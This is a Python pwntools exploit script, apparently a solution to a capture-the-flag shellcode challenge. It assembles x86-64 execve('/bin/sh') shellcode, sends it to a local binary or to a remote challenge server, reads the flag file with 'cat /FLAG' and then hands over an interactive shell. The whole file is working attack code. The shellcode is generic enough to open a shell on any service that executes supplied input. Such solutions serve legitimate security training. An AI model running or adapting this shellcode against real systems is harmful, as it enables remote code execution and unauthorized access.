#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

# Server details
exe = './shellcode'
port = 10257
base = 0
qemu_base = 0

# Define shellcode for spawning /bin/sh
shellcode = asm('''
    mov rax, 59
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')


# Setup connection
r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

# Interact with the server
def solve_challenge():
    print(r.recvuntil(b"Enter your code> "))
    r.sendline(shellcode)  # Send shellcode to the server
    r.sendline(b"cat /FLAG")  # Send command to read the FLAG
    flag = r.recvline().decode()  # Receive the FLAG
    print(f"FLAG: {flag}")

solve_challenge()
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
